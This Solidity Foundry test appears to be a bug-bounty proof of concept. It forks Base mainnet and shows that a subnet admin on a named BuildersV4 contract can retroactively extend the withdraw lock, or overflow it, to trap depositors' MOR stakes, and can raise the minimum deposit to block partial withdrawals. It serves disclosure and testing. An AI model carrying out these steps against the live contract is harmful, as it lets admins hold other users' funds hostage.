// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import "../src/Ifaces.sol";

// MORPHEUS BOUNTY PoC - C-L4-1: BuildersV4 withdraw-lock trap.
// Fork: Base mainnet block 61,369,794 (pinned in setUp via createSelectFork).
// Target: BuildersV4 proxy 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9 (Base).
// Rules honoured: fork-local only; NO vm.prank as owner/admin/multisig
// anywhere; every actor is a fresh unprivileged address funded with deal().
// The "subnet admin" actors are unprivileged users who created their own
// subnet through the permissionless createSubnet - the same role any
// staker-facing builder holds in production.
contract ForkLane4Test is Test {
    address internal constant BUILDERS = 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9;
    address internal constant MOR = 0x7431aDa8a591C955a994a21710752EF9b882b8e3;
    uint256 internal constant WEEK = 604800;

    IBuildersV4Min internal b = IBuildersV4Min(BUILDERS);
    IMOR internal mor = IMOR(MOR);

    address internal adminA = makeAddr("lane4-adminA");
    address internal adminB = makeAddr("lane4-adminB");
    address internal victim = makeAddr("lane4-victim");
    address internal victim2 = makeAddr("lane4-victim2");

    function setUp() public {
        vm.createSelectFork("https://base-rpc.publicnode.com", 61369794);
        address[4] memory actors = [adminA, adminB, victim, victim2];
        for (uint256 i = 0; i < actors.length; i++) {
            deal(MOR, actors[i], 3_000_000 ether);
            vm.prank(actors[i]);
            mor.approve(BUILDERS, type(uint256).max);
        }
    }

    function _subnet(address admin_, uint128 lock_, uint256 minDep_, address claimAdmin_)
        internal
        pure
        returns (Subnet memory)
    {
        return Subnet({
            name: "",
            admin: admin_,
            unusedStorage1_V4Update: 0,
            withdrawLockPeriodAfterDeposit: lock_,
            unusedStorage2_V4Update: 0,
            minimalDeposit: minDep_,
            claimAdmin: claimAdmin_
        });
    }

    function _meta() internal pure returns (SubnetMetadata memory) {
        return SubnetMetadata({slug: "", description: "", website: "", image: ""});
    }

    function _create(address admin_, string memory name_, uint128 lock_, uint256 minDep_, address claimAdmin_)
        internal
        returns (bytes32 id_)
    {
        Subnet memory s_ = _subnet(admin_, lock_, minDep_, claimAdmin_);
        s_.name = name_;
        vm.prank(admin_);
        b.createSubnet(s_, _meta());
        id_ = b.getSubnetId(name_);
    }

    function _deposit(address user_, bytes32 id_, uint256 amount_) internal {
        vm.prank(user_);
        b.deposit(id_, amount_);
    }

    // ------------------------------------------------------------------
    // C1 - CANDIDATE: a subnet admin retroactively extends the withdraw
    // lock on stakes already deposited, trapping other users' principal.
    // V1/V2/V3 made this impossible (editPoolDeadline + poolStart freeze);
    // V4 dropped both guards and withdraw() reads the lock live.
    // ------------------------------------------------------------------
    function test_C1_LockExtensionTrapsStakerPrincipal() public {
        uint256 t0 = block.timestamp;
        bytes32 id = _create(adminA, "lane4-lock-attack", uint128(WEEK), 1 ether, adminA);
        bytes32 ctl = _create(adminB, "lane4-lock-control", uint128(WEEK), 1 ether, adminB);

        _deposit(victim, id, 100 ether);
        _deposit(victim2, ctl, 100 ether);
        assertEq(mor.balanceOf(victim), 3_000_000 ether - 100 ether);

        // One day later the admin rewrites the lock to 100 years.
        vm.warp(t0 + 1 days);
        uint128 hundredYears = 3_155_760_000; // 100 * 365.25 days in seconds
        Subnet memory evil = _subnet(adminA, hundredYears, 1 ether, adminA);
        evil.name = "lane4-lock-attack";
        vm.prank(adminA);
        b.editSubnet(id, evil);
        (, , , uint128 storedLock, , , ) = b.subnets(id);
        assertEq(storedLock, hundredYears);

        // The original 7-day term matures - the victim still cannot exit.
        vm.warp(t0 + 8 days);
        vm.prank(victim);
        vm.expectRevert(bytes("BU: user withdraw is locked"));
        b.withdraw(id, 100 ether);

        // Partial withdrawals are equally blocked.
        vm.prank(victim);
        vm.expectRevert(bytes("BU: user withdraw is locked"));
        b.withdraw(id, 1 ether);

        // Ten years on: still locked. The principal sits in the contract.
        vm.warp(t0 + 315_576_000); // +10 years
        vm.prank(victim);
        vm.expectRevert(bytes("BU: user withdraw is locked"));
        b.withdraw(id, 100 ether);
        (, , uint256 stillStaked, ) = b.usersData(victim, id);
        assertEq(stillStaked, 100 ether);

        // Control: the never-edited subnet honoured its 7-day term.
        vm.prank(victim2);
        b.withdraw(ctl, 100 ether);
        assertEq(mor.balanceOf(victim2), 3_000_000 ether);

        // The lock lifts only at the admin's discretion - hostage, not burn.
        Subnet memory restore = _subnet(adminA, uint128(WEEK), 1 ether, adminA);
        restore.name = "lane4-lock-attack";
        vm.prank(adminA);
        b.editSubnet(id, restore);
        vm.prank(victim);
        b.withdraw(id, 100 ether);
        assertEq(mor.balanceOf(victim), 3_000_000 ether);
        console.log("C1 proven: 100 MOR locked past term, released only by admin edit");
    }

    // C1b - the uint128 lock can also be set so high that the withdraw
    // timelock addition overflows: withdraw reverts unconditionally.
    function test_C1b_LockExtensionOverflowVariant() public {
        bytes32 id = _create(adminA, "lane4-lock-overflow", uint128(WEEK), 1 ether, adminA);
        _deposit(victim, id, 10 ether);
        Subnet memory evil = _subnet(adminA, type(uint128).max, 1 ether, adminA);
        evil.name = "lane4-lock-overflow";
        vm.prank(adminA);
        b.editSubnet(id, evil);
        vm.warp(block.timestamp + 365 days);
        vm.prank(victim);
        vm.expectRevert(); // panic 0x11 (overflow) or lock message - either way, no exit
        b.withdraw(id, 10 ether);
    }

    // C2 - same edit vector, second leg: raising minimalDeposit after the
    // fact blocks partial withdrawals (full exit remains - lesser impact).
    function test_C2_MinimalDepositRaiseBlocksPartialWithdraw() public {
        uint256 t0 = block.timestamp;
        bytes32 id = _create(adminA, "lane4-mindep", uint128(WEEK), 1 ether, adminA);
        _deposit(victim, id, 50 ether);
        Subnet memory raised = _subnet(adminA, uint128(WEEK), 1000 ether, adminA);
        raised.name = "lane4-mindep";
        vm.prank(adminA);
        b.editSubnet(id, raised);
        vm.warp(t0 + 8 days);
        vm.prank(victim);
        vm.expectRevert(bytes("BU: invalid withdraw amount"));
        b.withdraw(id, 10 ether); // would leave 40 < new minimum of 1000
        vm.prank(victim);
        b.withdraw(id, 50 ether); // full exit still works
        assertEq(mor.balanceOf(victim), 3_000_000 ether);
    }
}
